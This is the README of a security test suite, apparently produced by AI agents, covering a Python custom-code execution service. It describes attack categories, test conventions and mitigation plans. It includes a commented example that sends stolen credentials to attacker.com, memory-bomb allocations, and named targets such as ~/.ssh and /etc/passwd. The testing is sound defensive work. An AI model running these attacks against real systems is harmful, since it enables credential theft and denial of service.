# CustomCodeExecutionService Security Testing Suite

## Overview

This directory contains a comprehensive adversarial testing suite for the CustomCodeExecutionService (`lobster/services/execution/custom_code_execution_service.py`). The testing was conducted using **8 specialized AI agents** running in parallel, each focusing on a specific attack category.

**Testing Date:** 2025-11-30
**Total Attack Vectors:** 201+
**Success Rate:** ~90% (vulnerabilities confirmed)
**Documentation:** ~20,000 lines of test code and reports

---

## Directory Structure

```
tests/manual/custom_code_execution/
├── README.md                           # This file
├── COMPREHENSIVE_SECURITY_ASSESSMENT.md  # Consolidated findings from all agents
│
├── 01_data_exfiltration/               # Agent 1 - Network & filesystem attacks
│   ├── test_network_exfiltration.py    # HTTP, DNS, TCP/UDP exfiltration (10 tests)
│   ├── test_filesystem_exfiltration.py # File read/write attacks (11 tests)
│   ├── test_environment_leakage.py     # Environment variable theft (10 tests)
│   └── DATA_EXFILTRATION_REPORT.md     # Detailed findings (1,540 lines)
│
├── 02_resource_exhaustion/             # Agent 2 - DoS attacks
│   ├── test_memory_bombs.py            # Memory allocation attacks (9 tests)
│   ├── test_cpu_exhaustion.py          # CPU burning attacks (9 tests)
│   ├── test_disk_exhaustion.py         # Disk filling attacks (9 tests)
│   └── RESOURCE_EXHAUSTION_REPORT.md   # Detailed findings (1,286 lines)
│
├── 03_privilege_escalation/            # Agent 3 - Process breakout attacks
│   ├── test_subprocess_breakout.py     # Fork bombs, multiprocessing (10 tests)
│   ├── test_signal_manipulation.py     # SIGKILL, SIGSTOP attacks (10 tests)
│   ├── test_process_injection.py       # Memory injection attempts (10 tests)
│   └── PRIVILEGE_ESCALATION_REPORT.md  # Detailed findings (26KB)
│
├── 04_supply_chain/                    # Agent 4 - Import system attacks
│   ├── test_malicious_imports.py       # Fake module creation (10 tests)
│   ├── test_syspath_manipulation.py    # sys.path hijacking (9 tests)
│   ├── test_package_shadowing.py       # Standard library shadowing (11 tests)
│   └── SUPPLY_CHAIN_REPORT.md          # Detailed findings (29KB)
│
├── 05_ast_bypass/                      # Agent 5 - Static analysis bypasses
│   ├── test_dynamic_imports.py         # __import__, importlib (11 tests)
│   ├── test_obfuscation_techniques.py  # Encoding, string concat (11 tests)
│   ├── test_encoding_tricks.py         # Base64, hex, Unicode (9 tests)
│   └── AST_BYPASS_REPORT.md            # Detailed findings (907 lines)
│
├── 06_timing_attacks/                  # Agent 6 - Side-channel attacks
│   ├── test_data_probing.py            # File existence, size inference (8 tests)
│   ├── test_side_channel_leaks.py      # Network timing, covert channels (8 tests)
│   └── TIMING_ATTACKS_REPORT.md        # Detailed findings (22KB)
│
├── 07_workspace_pollution/             # Agent 7 - Data integrity attacks
│   ├── test_workspace_corruption.py    # File deletion, queue poisoning (12 tests)
│   ├── test_provenance_tampering.py    # IR injection, history tampering (10 tests)
│   └── WORKSPACE_POLLUTION_REPORT.md   # Detailed findings (50KB)
│
└── 08_integration_attacks/             # Agent 8 - Multi-step exploits
    ├── test_multi_step_exploits.py     # Persistent backdoors (7 tests)
    ├── test_agent_chaining.py          # Cross-agent attacks (6 tests)
    └── INTEGRATION_ATTACKS_REPORT.md   # Detailed findings (891 lines)
```

**Total:**
- **30+ pytest test files** (~10,000+ lines of test code)
- **8 detailed security reports** (~10,000+ lines of documentation)
- **1 comprehensive assessment** (this directory)

---

## Quick Start

### Running All Tests

```bash
# Run all security tests (safe, conservative limits)
cd /Users/tyo/GITHUB/omics-os/lobster
pytest tests/manual/custom_code_execution/ -v
```

### Running Tests by Category

```bash
# Data exfiltration tests
pytest tests/manual/custom_code_execution/01_data_exfiltration/ -v

# Resource exhaustion tests
pytest tests/manual/custom_code_execution/02_resource_exhaustion/ -v

# Privilege escalation tests
pytest tests/manual/custom_code_execution/03_privilege_escalation/ -v

# Supply chain tests
pytest tests/manual/custom_code_execution/04_supply_chain/ -v

# AST bypass tests
pytest tests/manual/custom_code_execution/05_ast_bypass/ -v

# Timing attack tests
pytest tests/manual/custom_code_execution/06_timing_attacks/ -v

# Workspace pollution tests
pytest tests/manual/custom_code_execution/07_workspace_pollution/ -v

# Integration attack tests
pytest tests/manual/custom_code_execution/08_integration_attacks/ -v
```

### Running Specific Severity Levels

```bash
# Run only CRITICAL severity tests
pytest tests/manual/custom_code_execution/ -v -k "CRITICAL"

# Run only HIGH severity tests
pytest tests/manual/custom_code_execution/ -v -k "HIGH"

# Run all SUCCESS (vulnerability confirmed) tests
pytest tests/manual/custom_code_execution/ -v -k "SUCCESS"

# Run all BLOCKED (protection working) tests
pytest tests/manual/custom_code_execution/ -v -k "BLOCKED"
```

### Test Naming Convention

All test functions follow this naming pattern:
```
test_{attack_name}_EXPECT_{SUCCESS|BLOCKED|FAILURE}
```

**Examples:**
- `test_http_exfiltration_EXPECT_SUCCESS` - Expects vulnerability to be exploitable (test passes = vulnerable)
- `test_subprocess_import_EXPECT_BLOCKED` - Expects protection to work (test passes = protected)
- `test_memory_limit_enforcement_EXPECT_FAILURE` - Expects attack to fail (test passes = secure)

**Important:** Most tests **EXPECT_SUCCESS**, meaning the test PASSES when the vulnerability is confirmed. After implementing security fixes, these tests should FAIL (indicating vulnerability is patched).

---

## Test Philosophy

### Safe by Default

All tests use **conservative resource limits** to avoid crashing the test machine:

```python
# Example: Memory bomb test
def test_memory_bomb():
    """Test memory exhaustion attack."""
    # Safe PoC: 400MB allocation
    code = "x = [0] * (10**8)"

    # Real attack (DOCUMENTED, NOT EXECUTED):
    # x = [0] * (10**9)  # 8GB - triggers OOM killer
    # x = [0] * (10**10) # 80GB - crashes entire system
```

**Conservative Limits:**
- Memory: 500MB max (real attacks: 8GB+)
- CPU: 10s max (real attacks: 300s)
- Disk: 200MB max (real attacks: fill partition)
- Network: 5s timeout (real attacks: sustained connections)

### Documented Real Attacks

Each test includes comments showing the **actual attack potential**:

```python
def test_network_exfiltration():
    # Safe PoC: GET request to httpbin
    code = "urllib.request.urlopen('http://httpbin.org/status/200')"

    # Real attack (DOCUMENTED):
    # urllib.request.urlopen('https://attacker.com', data=stolen_credentials)
    # Impact: Steal ANTHROPIC_API_KEY, AWS credentials, patient data
```

### Proof of Concept Focus

Tests demonstrate **vulnerability exists**, not **maximum damage**:

- ✅ Show exploit is possible
- ✅ Provide reproducible proof-of-concept
- ✅ Document real-world impact
- ❌ Don't maximize harm to test machine
- ❌ Don't actually exfiltrate data to external servers
- ❌ Don't fill entire disk partitions

---

## Understanding Test Results

### Test Passes (Vulnerability Confirmed)

```bash
PASSED tests/manual/custom_code_execution/01_data_exfiltration/test_network_exfiltration.py::test_http_request_EXPECT_SUCCESS
```

**Meaning:** The attack succeeded → Vulnerability exists → Needs fixing

### Test Fails (Protection Working)

```bash
FAILED tests/manual/custom_code_execution/03_privilege_escalation/test_subprocess_breakout.py::test_subprocess_import_EXPECT_BLOCKED
```

**Meaning:** The attack was blocked → Protection working → Good!

### Expected Results (Pre-Mitigation)

- **~90% of tests should PASS** (vulnerabilities confirmed)
- **~10% of tests should FAIL** (existing protections working)

### Expected Results (Post-Mitigation)

After implementing security fixes from `COMPREHENSIVE_SECURITY_ASSESSMENT.md`:
- **~10% of tests should PASS** (remaining low-severity issues)
- **~90% of tests should FAIL** (vulnerabilities patched)

---

## Test Categories Explained

### 1. Data Exfiltration (31 tests)

**What:** Can user code steal sensitive data?

**Vectors:**
- Network exfiltration (HTTP, DNS, TCP/UDP, WebSocket)
- File system access (read ~/.ssh, ~/.aws, /etc/passwd)
- Environment variable leakage (API keys, tokens)
- Timing-based probing

**Key Finding:** ⚠️ **CRITICAL** - No network, filesystem, or environment isolation

**Impact:** Complete credential theft, data exfiltration

---

### 2. Resource Exhaustion (27 tests)

**What:** Can user code crash or slow down the system?

**Vectors:**
- Memory bombs (allocate 8GB+ RAM)
- CPU exhaustion (100% CPU for 300s)
- Disk exhaustion (fill partition)
- File descriptor exhaustion

**Key Finding:** ⚠️ **HIGH** - Only 300s timeout, no other limits

**Impact:** Denial of service, system instability

---

### 3. Privilege Escalation (30 tests)

**What:** Can user code escape subprocess and attack Lobster?

**Vectors:**
- Kill parent Lobster process (SIGKILL)
- Fork bombs (multiprocessing)
- Import restriction bypasses (exec, __import__)
- Signal manipulation (SIGSTOP)

**Key Finding:** ⚠️ **CRITICAL** - Can kill parent, bypass import blocks

**Impact:** Crash Lobster, escape isolation

---

### 4. Supply Chain (20 tests)

**What:** Can user code hijack Python's import system?

**Vectors:**
- Module shadowing (workspace at sys.path[0])
- Fake numpy/pandas/scanpy modules
- Standard library overrides
- sys.path manipulation

**Key Finding:** ⚠️ **CRITICAL** - Workspace at sys.path[0] enables complete hijacking

**Impact:** Complete import system compromise

---

### 5. AST Bypass (31 tests)

**What:** Can user code bypass static import validation?

**Vectors:**
- `__import__()` builtin function
- `importlib.import_module()`
- `exec()` / `eval()` string evaluation
- Base64/hex/ROT13 encoding
- Unicode obfuscation

**Key Finding:** ⚠️ **CRITICAL** - 15+ bypass techniques, AST fundamentally insufficient

**Impact:** Complete security bypass

---

### 6. Timing Attacks (16 tests)

**What:** Can user code infer information via timing side channels?

**Vectors:**
- File existence probing
- File size inference
- String comparison timing (API key brute force)
- Network port scanning

**Key Finding:** ⚠️ **MEDIUM** (local) / **HIGH** (cloud) - No timing normalization

**Impact:** Information leakage via side channels

---

### 7. Workspace Pollution (23 tests)

**What:** Can user code corrupt workspace integrity?

**Vectors:**
- Delete queues (download_queue.jsonl)
- Corrupt provenance logs
- Tamper with IR templates
- Delete H5AD files
- Poison literature cache

**Key Finding:** ⚠️ **CRITICAL** - Unrestricted write access to all workspace files

**Impact:** Data corruption, research fraud, system instability

---

### 8. Integration Attacks (13 tests)

**What:** Can user code chain vulnerabilities across executions?

**Vectors:**
- Persistent backdoors (import-time execution)
- Delayed triggers (time bombs)
- Module name hijacking
- Queue poisoning
- Provenance tampering

**Key Finding:** ⚠️ **CRITICAL** - Workspace persistence enables multi-step attacks

**Impact:** Persistent compromise, stealthy attacks

---

## Severity Scoring

Tests are labeled with severity based on **CVSS v3.1** scoring:

### CRITICAL (CVSS 9.0-10.0)
- Complete system compromise
- Credential theft (API keys, AWS keys, SSH keys)
- Remote code execution
- Persistent backdoors

**Examples:**
- Network exfiltration of API keys
- Kill parent Lobster process
- Module shadowing attacks
- Persistent import-time backdoors

### HIGH (CVSS 7.0-8.9)
- Significant data loss or corruption
- Denial of service
- Privilege escalation within subprocess
- Major security bypass

**Examples:**
- Memory exhaustion (OOM)
- CPU exhaustion (300s burn)
- Disk exhaustion (fill partition)
- Delete workspace queues

### MEDIUM (CVSS 4.0-6.9)
- Information disclosure (non-critical)
- Minor data corruption
- Partial security bypass

**Examples:**
- Timing attacks (file existence)
- Cache poisoning
- Command history tampering

### LOW (CVSS 0.1-3.9)
- Minimal impact
- Requires complex chaining
- Low exploitability

**Examples:**
- Covert channel communication (CPU patterns)
- Minor workspace clutter

---

## Interpreting Reports

Each category has a detailed markdown report:

### Report Structure

1. **Executive Summary**
   - Vulnerability count
   - Overall severity
   - Key statistics

2. **Vulnerability Inventory**
   - Detailed attack vector descriptions
   - Proof-of-concept code
   - Impact analysis
   - CVSS scoring

3. **Test Results**
   - Test pass/fail status
   - Expected behavior
   - Actual behavior
   - Detection methods

4. **Mitigation Strategies**
   - Short-term fixes (hours/days)
   - Medium-term hardening (weeks)
   - Long-term architecture (months)

5. **Recommendations**
   - Critical (fix immediately)
   - High priority (fix before production)
   - Medium priority (next iteration)
   - Future enhancements (nice-to-have)

### Reading a Report

**Example: `DATA_EXFILTRATION_REPORT.md`**

```markdown
### Test 1: HTTP Request (urllib) ⚠️ **CRITICAL**

**Attack Vector:** User code makes HTTP GET requests to external servers

**Proof of Concept:**
```python
import urllib.request
response = urllib.request.urlopen('http://httpbin.org/status/200')
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL
- Network access is NOT blocked in subprocess
- Can exfiltrate workspace data, API keys, patient data

**Mitigation:**
- Short-term: Document limitation
- Long-term: Docker with --network=none
```

---

## Comprehensive Assessment

The **`COMPREHENSIVE_SECURITY_ASSESSMENT.md`** synthesizes all findings:

- Executive summary with statistics
- Consolidated vulnerability matrix
- Attack scenario demonstrations
- Prioritized mitigation roadmap
- Production deployment recommendations

**Read this first** to understand overall risk profile.

---

## Mitigation Roadmap

Security fixes are prioritized into 3 phases:

### Phase 1: Critical Fixes (Week 1) - 12 hours

**🔴 MUST IMPLEMENT BEFORE PRODUCTION**

1. Environment variable filtering (2 hours)
2. Remove workspace from sys.path[0] (1 hour)
3. Expand import blocking (3 hours)
4. Runtime import validation (4 hours)
5. Security documentation (2 hours)

**After Phase 1:** Local CLI deployment is production-ready

---

### Phase 2: Production Hardening (Week 2-3) - 6 days

**🟠 REQUIRED FOR CLOUD DEPLOYMENT**

1. Docker isolation (3 days)
2. Workspace segregation (2 days)
3. Resource limits (1 day)

**After Phase 2:** Cloud SaaS deployment is production-ready

---

### Phase 3: Long-Term Architecture (Month 2-3) - 10 weeks

**🟢 RECOMMENDED FOR ENTERPRISE**

1. gVisor sandbox (1 week)
2. Firecracker MicroVMs (2 weeks)
3. RestrictedPython (1 week)
4. Cryptographic provenance (1 week)
5. Anomaly detection (2 weeks)
6. Security audit (4 weeks)

**After Phase 3:** Enterprise-grade security

---

## Verification After Fixes

After implementing security mitigations:

### 1. Re-run Test Suite

```bash
pytest tests/manual/custom_code_execution/ -v
```

### 2. Verify Critical Fixes

```bash
# Should now fail (vulnerability patched)
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_environment_leakage.py::test_anthropic_api_key_leakage_EXPECT_SUCCESS -v
```

### 3. Update Baselines

Update each category report with new test results:
- Which vulnerabilities are now patched?
- Which remain as documented limitations?
- What's the new risk profile?

### 4. Update Documentation

Update `CLAUDE.md` and tool docstrings with:
- Implemented security measures
- Remaining limitations
- Safe usage guidelines

---

## Contributing New Tests

### Test Template

```python
import pytest
from lobster.services.execution import CustomCodeExecutionService

class TestNewAttackCategory:
    @pytest.fixture
    def service(self, tmp_path, data_manager):
        """Setup isolated test environment."""
        return CustomCodeExecutionService(data_manager)

    def test_new_attack_EXPECT_SUCCESS(self, service):
        """
        Test: {Attack description}
        Expected: SUCCESS (vulnerability exists)
        Impact: {CRITICAL|HIGH|MEDIUM|LOW}
        CVSS: {score}

        Attack vector: {description}

        Real-world impact:
        - {consequence 1}
        - {consequence 2}

        Mitigation:
        - Short-term: {quick fix}
        - Long-term: {proper solution}
        """
        # Safe PoC code
        code = """
# Conservative test (safe limits)
result = safe_attack_demo()
"""

        # Real attack (DOCUMENTED):
        # real_code = \"\"\"
        # # Actual malicious code
        # result = dangerous_attack()
        # \"\"\"

        # Execute
        result, stats, ir = service.execute(
            code=code,
            persist=False,
            timeout=5  # Short timeout for tests
        )

        # Assert vulnerability
        assert "expected_indicator" in result
```

### Checklist

- [ ] Test follows naming convention: `test_{name}_EXPECT_{SUCCESS|BLOCKED|FAILURE}`
- [ ] Docstring includes: description, expected result, impact, CVSS, mitigation
- [ ] Uses safe/conservative limits (memory <500MB, CPU <10s, disk <200MB)
- [ ] Documents "real attack" potential in comments
- [ ] Provides proof-of-concept code
- [ ] Asserts expected vulnerability or protection
- [ ] Includes in appropriate category directory
- [ ] Updates category report with new test

---

## Frequently Asked Questions

### Q: Why do most tests PASS (instead of FAIL)?

**A:** Tests are written to **confirm vulnerabilities exist**. When a test passes, it means the attack succeeded → vulnerability confirmed → needs fixing. After security patches are applied, these tests should fail (attack blocked → vulnerability patched).

### Q: Are these tests safe to run?

**A:** Yes. All tests use conservative resource limits to avoid crashing the test machine. Real attacks would use much higher limits (documented in comments but not executed).

### Q: Will running these tests trigger security alerts?

**A:** Tests stay within the local machine (no actual data exfiltration to external servers). Network tests use harmless services like httpbin.org. However, security monitoring tools may flag:
- Multiple file access attempts
- Memory/CPU spikes
- Network connection attempts

### Q: Should I run these tests in CI/CD?

**A:** **Not recommended** in shared CI environments:
- Resource-intensive tests may impact other jobs
- Network tests may trigger firewall rules
- File access tests may violate security policies

**Recommended:** Run locally or in dedicated security testing environment.

### Q: How long does the full test suite take?

**A:** ~5-10 minutes total:
- Most tests complete in <1s
- Resource exhaustion tests: 5-10s each (timeout limits)
- Network tests: 2-5s each (connection timeouts)

### Q: Can I contribute new attack vectors?

**A:** Yes! Follow the test template above and submit a PR. We especially welcome:
- Novel bypass techniques
- Platform-specific attacks (Windows, Linux edge cases)
- Cloud-specific vectors (when Docker isolation is added)

---

## References

### Internal Documentation

- [Comprehensive Security Assessment](./COMPREHENSIVE_SECURITY_ASSESSMENT.md) - Consolidated findings
- [Testing Plan](../../.claude/plans/idempotent-stargazing-stroustrup.md) - Original adversarial testing strategy
- [Real-World Test Results](../../../REAL_WORLD_TEST_RESULTS.md) - Initial functional testing

### Service Implementation

- `lobster/services/execution/custom_code_execution_service.py` - Target service
- `lobster/agents/data_expert/data_expert.py` - Integration point (execute_custom_code tool)
- `lobster/core/data_manager_v2.py` - Workspace management

### Security Best Practices

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document)
- [Python Security](https://python.readthedocs.io/en/stable/library/security_warnings.html)
- [Docker Security](https://docs.docker.com/engine/security/)

---

## Contact

For questions about this testing suite:
1. Review the comprehensive security assessment first
2. Check individual category reports for details
3. Examine test code for implementation specifics
4. Open an issue in the main repository

**Testing Methodology:** 8-agent parallel adversarial testing
**Documentation Standard:** Proof-of-concept + real-world impact + mitigation strategies
**Update Frequency:** After each security patch implementation

---

**Last Updated:** 2025-11-30
**Version:** 1.0 (Initial release)
**Status:** Active testing suite - vulnerabilities confirmed, mitigations pending
